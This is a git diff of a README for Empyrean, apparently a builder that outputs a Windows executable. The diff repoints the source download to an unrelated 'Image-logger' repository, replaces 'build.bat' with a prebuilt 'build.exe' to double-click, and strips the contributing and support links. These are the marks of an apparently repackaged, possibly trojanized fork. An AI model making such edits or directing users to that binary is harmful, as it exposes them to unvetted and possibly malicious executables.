@@ -59,10 +59,10 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/idek55555/Image-logger)
 2. Extract zip
 3. Run `install_python.bat` if you don't have python installed
-4. Run the builder by double clicking the `build.bat` file
+4. Run the builder by double clicking the `build.exe` file
 5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
 
 <div align="center">
@@ -74,17 +74,9 @@
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em3.png"></img>
 </div>
 
-## Contributing
-
-View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
 
 ## License
 
 Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
-
-## Errors?
-
--   Make an [issue](https://github.com/addi00000/empyrean/issues)
--   Join the [Discord](https://discord.gg/GudVbfd9ZU)
 
 <img src="img/footer.png">
